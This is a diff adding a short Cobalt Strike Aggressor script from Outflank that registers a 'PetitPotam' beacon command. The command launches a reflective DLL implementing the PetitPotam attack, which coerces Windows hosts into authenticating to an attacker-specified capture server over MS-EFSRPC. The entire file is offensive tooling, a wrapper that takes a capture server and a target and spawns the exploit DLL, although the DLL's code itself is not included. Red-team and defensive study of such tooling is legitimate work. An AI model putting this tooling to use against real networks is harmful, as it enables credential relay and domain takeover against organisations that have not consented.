@@ -1,0 +1,22 @@
+#author Cornelis de Plaa
+#@outflank.nl
+
+#Reflective Dll implementation of the PetitPotam exploit originally created by @topotam77
+#https://github.com/topotam/PetitPotam
+
+#register help
+beacon_command_register("PetitPotam", "Coerce Windows hosts to authenticate to other machines via MS-EFSRPC.",
+	"Synopsis: PetitPotam <capture server ip or hostname> <target server ip or hostname>\n\n" .
+	"Reflective Dll implementation of the PetitPotam exploit.\n");
+
+alias PetitPotam {
+	$bid = $1;
+	$params = substr($0, 11);
+
+	if ($params eq "") {
+		berror($bid, "Specify params.");
+		return;
+	}
+
+	bdllspawn($1, script_resource("PetitPotam.dll"), $params, "PetitPotam", 5000, false);
+}
